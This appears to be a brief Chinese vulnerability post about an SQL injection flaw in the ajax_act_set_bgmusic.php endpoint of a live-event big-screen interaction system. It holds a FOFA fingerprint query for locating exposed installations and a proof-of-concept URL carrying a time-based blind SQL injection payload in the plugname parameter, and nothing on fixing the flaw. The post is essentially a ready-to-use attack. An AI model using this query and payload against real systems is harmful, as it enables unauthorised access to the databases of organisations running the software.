# 金华迪加现场大屏互动系统ajax_act_set_bgmusic.php接口存在SQL注入漏洞

清晨 

[摸鱼划水](javascript:void(0);)

FOFA

```
body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
```

POC

```
/wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=1"+or+if(length(database())>5,sleep(1),1)--+
```

